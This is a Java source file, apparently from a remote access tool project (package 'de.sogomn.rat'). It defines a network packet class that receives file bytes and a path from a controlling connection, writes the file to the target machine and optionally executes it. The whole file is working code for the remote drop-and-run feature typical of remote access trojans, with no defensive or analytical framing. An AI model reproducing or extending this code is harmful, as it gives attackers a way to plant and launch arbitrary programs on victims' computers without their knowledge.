/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.packet;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveConnection;

public final class UploadFilePacket implements IPacket {
	
	private String path;
	private byte[] data;
	private byte executeType;
	
	private static final byte NO = 0;
	private static final byte YES = 1;
	
	public UploadFilePacket(final String path, final byte[] data, final boolean execute) {
		this.path = path;
		this.data = data;
		
		executeType = execute ? YES : NO;
	}
	
	public UploadFilePacket(final String filePath, final byte[] data) {
		this(filePath, data, false);
	}
	
	public UploadFilePacket() {
		path = "";
		data = new byte[0];
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeInt(data.length);
		connection.write(data);
		connection.writeUtf(path);
		connection.writeByte(executeType);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		final int length = connection.readInt();
		
		data = new byte[length];
		connection.read(data);
		
		path = connection.readUtf();
		executeType = connection.readByte();
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		FileUtils.createFile(path);
		FileUtils.writeData(path, data);
		
		if (executeType == YES) {
			FileUtils.executeFile(path);
		}
	}
	
}
